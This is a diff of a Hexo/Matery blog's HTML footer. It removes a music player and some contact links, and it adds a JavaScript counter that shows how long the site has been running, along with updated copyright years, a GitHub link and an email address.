-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
-
-    
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2024</span>
+                <span id="year">2024</span>
             
-            <span id="year">2019</span>
+            <span id="year">2024</span>
             <a href="/about" target="_blank">Xu Shouyin</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
@@ -1117,39 +1178,67 @@ Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_
             
             <br>
             
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2024";
+                    var startMonth = "4";
+                    var startDate = "21";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
             <br>
             
         </div>
         <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <a href="https://github.com/Xsyin" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:shouyinxu@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
 
 
 
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
 
 </div>
     </div>
